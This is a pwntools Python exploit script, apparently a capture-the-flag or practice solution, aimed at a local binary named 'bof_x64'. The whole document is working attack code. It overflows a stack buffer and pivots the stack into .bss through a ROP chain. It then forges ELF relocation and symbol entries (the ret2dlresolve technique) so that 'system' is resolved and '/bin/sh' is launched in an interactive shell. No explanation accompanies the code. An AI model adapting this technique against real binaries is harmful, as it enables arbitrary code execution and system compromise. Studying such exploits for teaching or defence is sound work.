from pwn import *
context(arch="amd64", os="linux")

sh = process("./bof_x64")
pwn = ELF("./bof_x64")
read = pwn.plt["read"]
base_stage = pwn.bss() + 0x800
pop_rbp_ret = 0x401139
pop_rdi_ret = 0x4012bb
pop_rdx_ret = 0x401204
pop_rsi_ret = 0x401202
leave_ret = 0x401187
payload1 = flat(['a'*0x78, pop_rdi_ret, 0, pop_rsi_ret, base_stage, pop_rdx_ret, 0x200, read, pop_rbp_ret, base_stage, leave_ret])
sh.sendline(payload1)

cmd = "/bin/sh"
write = pwn.plt["write"]
write_got = pwn.got["write"]
plt0 = 0x401020
rel_plt = 0x4004f8
dynsym = 0x400330
dynstr = 0x400408
reloc_offset = base_stage + 72 - rel_plt
align1 = ''
while reloc_offset % 0x18 != 0:
	align1 += 'a'
	reloc_offset += 1
reloc_index = reloc_offset / 0x18
align2 = ''
sym_offset = reloc_offset + rel_plt + 0x18 - dynsym
while sym_offset % 0x18 != 0:
	align2 += 'a'
	sym_offset += 1
sym_index = sym_offset / 0x18
r_info = (sym_index << 32) | 7
system_offset = sym_offset + dynsym + 0x18 - dynstr
fake_reloc = flat([write_got, r_info, 0])
fake_sym = p32(system_offset) + p32(0x12) + p64(0) + p64(0)
payload2 = 'a' * 8
payload2 += flat([pop_rdi_ret, base_stage+0x100, pop_rsi_ret, base_stage+0x100, pop_rdx_ret, len(cmd), plt0, reloc_index])
payload2 += align1 + fake_reloc
payload2 += align2 + fake_sym
payload2 += "system\x00"
payload2 += 'a' * (0x100 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'a' * (0x200 - len(payload2))
sh.sendline(payload2)
sh.interactive()